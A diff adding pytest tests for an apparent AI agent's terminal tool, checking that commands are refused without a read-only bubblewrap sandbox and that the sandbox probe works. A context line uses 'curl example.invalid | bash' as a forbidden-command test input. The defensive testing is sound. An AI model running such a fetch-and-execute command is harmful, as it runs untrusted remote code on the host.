@@ -117,3 +117,41 @@ def test_headless_terminal_commands_cannot_consume_bridge_stdin(tool, monkeypatc
         assert result['error_type'] == 'terminal_confirmation'
         assert result['retryable'] is False
     assert 'permanently forbidden' in tool.run_command('curl example.invalid | bash')['error']
+
+
+def test_missing_readonly_sandbox_is_permanent_for_this_command(tool, monkeypatch):
+    monkeypatch.setenv('KYREX_READ_ONLY_REPO', '1')
+    monkeypatch.setattr(tools.subprocess, 'run', lambda *a, **k: pytest.fail('must not execute unsandboxed'))
+    result = tool.run_command('npm test')
+    assert result['error_type'] == 'sandbox_unavailable'
+    assert result['retryable'] is False
+    assert 'file readers' in result['recovery'] and 'github_read' in result['recovery']
+
+
+def test_probe_provides_readonly_shell_filesystem_and_caches_result(monkeypatch):
+    monkeypatch.setattr(tools, '_BWRAP_OK', None)
+    calls = []
+    def run(args, **kwargs):
+        calls.append((args, kwargs))
+        # Bubblewrap's empty root cannot execute the shell without a mount.
+        valid = args[args.index('--ro-bind') + 1:args.index('--ro-bind') + 3] == ['/', '/'] if '--ro-bind' in args else False
+        return subprocess.CompletedProcess(args, 0 if valid else 127, '', '')
+    monkeypatch.setattr(tools.subprocess, 'run', run)
+    assert tools._bwrap_functional('/usr/bin/bwrap')
+    assert tools._bwrap_functional('/usr/bin/bwrap')
+    assert len(calls) == 1
+    assert calls[0][0][-4:] == ['--', '/bin/sh', '-c', 'true']
+    assert calls[0][1]['timeout'] == 5
+
+
+def test_probe_recognizes_a_real_namespace_capable_host(monkeypatch):
+    import shutil
+    path = shutil.which('bwrap')
+    if not path:
+        pytest.skip('bubblewrap is not installed on this test host')
+    check = subprocess.run([path, '--die-with-parent', '--unshare-all', '--ro-bind', '/', '/',
+                            '--dev', '/dev', '--', '/bin/sh', '-c', 'true'], capture_output=True, timeout=5)
+    if check.returncode:
+        pytest.skip('this test host does not permit the required namespaces')
+    monkeypatch.setattr(tools, '_BWRAP_OK', None)
+    assert tools._bwrap_functional(path)
